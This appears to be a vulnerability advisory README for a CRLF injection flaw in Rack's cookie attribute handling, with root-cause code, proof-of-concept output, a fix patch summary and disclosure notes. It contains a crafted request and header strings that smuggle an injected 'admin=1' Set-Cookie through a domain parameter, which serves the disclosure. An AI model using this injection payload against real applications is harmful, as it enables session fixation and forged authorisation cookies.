# CRLF injection in Rack cookie attributes (`set_cookie_header`)

`Rack::Utils.set_cookie_header` validates the cookie key and escapes the cookie value, but interpolates the
`:domain`, `:path` and `:max_age` attributes into the `set-cookie` header **verbatim**. An application that passes
request-derived data into one of those attributes can therefore emit an attacker-controlled `Set-Cookie` header
(or a fully split response, on servers that do not sanitise header values).

* **Component**: [`rack`](https://github.com/rack/rack) — `lib/rack/utils.rb` (`set_cookie_header`),
  reached from `Rack::Response#set_cookie`
* **Class**: CWE-113 / CWE-93 (CRLF injection → HTTP response splitting)
* **Verified on**: rack `1.6.13`, `2.0.9`, `2.2.13` (`2-2-stable`), `3.2.0` (`main` @ `58e5d22`), `3.2.7` (latest released gem)
* **Suggested severity**: Medium (CVSS:3.1 `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` = 6.1) — realised when an
  application copies request data into the attribute (idiomatic patterns below)
* **Status**: vendor notification pending — see [Disclosure](#disclosure)

---

## Root cause

```ruby
# lib/rack/utils.rb:375-403  (rack 3.2.7)
def set_cookie_header(key, value)
  unless key =~ VALID_COOKIE_KEY
    raise ArgumentError, "invalid cookie key: #{key.inspect}"   # <- key IS validated
  end

  case value
  when Hash
    domain  = "; domain=#{value[:domain]}"   if value[:domain]     # <- not validated
    path    = "; path=#{value[:path]}"       if value[:path]       # <- not validated
    max_age = "; max-age=#{value[:max_age]}" if value[:max_age]    # <- not validated
```

The asymmetry is visible in one line of output: the **value** is percent-encoded, the **attributes** are not.

```ruby
Rack::Utils.set_cookie_header!(h, "n", "v\r\nX: 1")                                  # -> "n=v%0D%0AX%3A+1"
Rack::Utils.set_cookie_header!(h, "n", {value: "v", path: "/\r\nX-B: 1"})            # -> "n=v; path=/\r\nX-B: 1"
```

The same code has been present since at least rack 1.6.x:

| version | code |
|---|---|
| 1.6.13 | `domain = "; domain=" + value[:domain]` (utils.rb:284) |
| 2.0.9 | `domain  = "; domain=#{value[:domain]}"` (utils.rb:221) |
| 2.2.13 / 2-2-stable | same, utils.rb:241 / :271 |
| 3.2.0 / 3.2.7 | same, utils.rb:382 |

## Rack contradicts its own contract

`Rack::Lint` — the conformance layer shipped with rack — rejects exactly the header that rack just produced:

```
Rack::Lint::LintError: invalid header value set-cookie:
  "tenant=acme; domain=.evil.example\r\nadmin=1; Path=/; Max-Age=31536000; httponly"
```

## Proof of concept

Self-contained, no server required for parts 1–2, spawns Puma for part 3:

```
$ ruby poc/poc_cookie_injection.rb
=== Part 1 — library level ===
header : "tenant=acme; domain=.evil.example\r\nadmin=1; Path=/; Max-Age=31536000; httponly"
CRLF present in header value? true
=== Part 2 — Rack::Lint rejects the header Rack just produced ===
Lint: Rack::Lint::LintError: invalid header value set-cookie: "..."
=== Part 3 — end-to-end: Puma 8.0.2 emits an attacker-controlled Set-Cookie ===
request : GET /?tenant=evil.example%0D%0Aadmin%3D1%3B%20Path%3D%2F%3B%20Max-Age%3D31536000 HTTP/1.1
response: "HTTP/1.1 200 OK\r\nset-cookie: admin=1; Path=/; Max-Age=31536000; httponly\r\n..."
RESULT  : VULNERABLE — the injected cookie is emitted as its own Set-Cookie header
```

The vulnerable application pattern used in part 3 is ordinary multi-tenant cookie scoping:

```ruby
res.set_cookie("tenant", { value: "acme", domain: ".#{req.params['tenant']}", httponly: true })
```

Because rack percent-decodes query and form values before the application sees them, CRLF arrives intact —
no request smuggling is needed to reach the sink.

### Server behaviour matrix (measured)

| server | handling of the malformed value | attacker outcome |
|---|---|---|
| Puma 8.0.2 | splits the value on LF, drops fragments containing CR, emits the rest as separate `set-cookie` lines | **arbitrary cookie injected** |
| WEBrick 1.9.1 | `WEBrick::HTTPResponse::InvalidHeader` → 500 | fails closed |
| `Rack::Lint` | `LintError: invalid header value` | fails closed (development only) |

## Impact

1. **Arbitrary cookie injection / session fixation.** Applications that let a user influence the cookie domain or
   path will set cookies chosen by the attacker — including cookies the application later trusts for authorisation,
   tenant scoping or "remember me" state. `HttpOnly` on the legitimate cookie does not help; the injected cookie is a
   separate one.
2. **Response splitting** on any server/proxy that writes the header value verbatim: header injection, body
   injection, cache poisoning. Puma and WEBrick protect this particular sink; that is a property of those servers,
   not of rack, and the same value passes through `Rack::Response` to any handler.
3. **Spec violation.** rack documents header values as `\r\n`-free; its cookie builder can emit them.

## Fix

`patch/0001-validate-cookie-attributes.diff` validates the three attributes and raises `ArgumentError`, mirroring
how the key is already treated:

```
lib/rack/utils.rb | 23 +++++++++++++++++++++++
1 file changed, 23 insertions(+)
```

Verification:

```
$ ruby -Ilib -Itest test/spec_utils.rb            # existing suite, with patch applied
64 runs, 304 assertions, 0 failures, 0 errors, 0 skips

$ ruby -Ilib -Itest test/spec_cookie_attributes.rb   # this repository's regression test
# unpatched: 6 runs, 4 failures  (the CRLF cases are accepted)
# patched  : 6 runs, 14 assertions, 0 failures
```

Legitimate values keep working (`.example.com`, `localhost`, `127.0.0.1`, `/`, `/app/section`, `3600`).

## Disclosure

* Duplicate check (2026-10-29): `repo:rack/rack` issue search — `set-cookie injection` 0 hits, `cookie injection` 2
  unrelated; GHSA (51 rack advisories, 15 from 2026) — the three CWE-93 ones cover multipart header unfolding,
  `Rack::Sendfile` and `Rack::CommonLogger`, none covers `set_cookie_header` attributes.
* Vendor channel per rack's `SECURITY.md`: GitHub private vulnerability reporting
  (<https://github.com/rack/rack/security> → "Report a Vulnerability"). The Internet Bug Bounty program on
  HackerOne currently reports `submission_state: paused`.
* This document is published as-is, without an embargo, by the reporter. Remediation (the patch above) is included
  so users can apply it immediately.

## Repository layout

```
README.md                                   this advisory
poc/poc_cookie_injection.rb                 self-contained proof of concept
patch/0001-validate-cookie-attributes.diff  fix against rack main (58e5d22), applies with `git apply`
test/regression_test.rb                     minitest regression test for rack's suite
```
